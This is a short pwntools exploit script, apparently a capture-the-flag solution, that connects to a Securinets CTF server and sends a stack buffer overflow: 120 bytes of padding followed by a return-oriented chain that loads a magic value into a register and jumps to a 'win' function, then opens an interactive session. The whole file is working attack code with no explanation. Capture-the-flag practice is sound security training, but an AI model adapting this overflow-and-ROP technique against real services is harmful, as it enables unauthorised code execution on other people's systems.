from pwn import *

pop_rdi = 0x0000000000401373
pop_rsi = 0x0000000000401371
ret     = 0x000000000040101a
win     = 0x40125b

p = remote("pwn.ctf.securinets.tn", 8898)

payload = b"a"*120
payload += p64(pop_rsi) + p64(0xf672ae02) + p64(0)
payload += p64(win)

p.sendline(payload)

p.interactive()
